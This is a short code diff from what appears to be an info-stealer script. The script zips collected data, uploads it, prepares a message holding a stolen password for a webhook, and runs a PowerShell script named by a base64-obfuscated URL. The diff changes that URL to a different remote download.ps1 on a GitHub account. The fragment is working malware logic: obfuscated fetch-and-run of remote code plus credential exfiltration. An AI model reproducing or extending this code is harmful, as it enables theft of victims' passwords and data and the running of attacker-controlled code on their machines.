@@ -145,7 +145,7 @@ if zip_size>20*1024*1024:
 	with open(zip_path,'wb')as f:f.write(zip_data)
 	link=upload_file(zip_path)
 else:link=None
-run_powershell_script(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzQzYTE3MjMvdGVzdC9tYWluL2Rvd25sb2FkLnBzMQ').decode())
+run_powershell_script(base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3MxdWlhc2RhZC9sb2ctYWNjLXYyL21haW4vc2NyL2Rvd25sb2FkLnBzMQ').decode())
 content=f"hai1723 on top\npassword:{password}"
 filename=_E
 webhook_url='YOUR_WEBHOOK_URL'
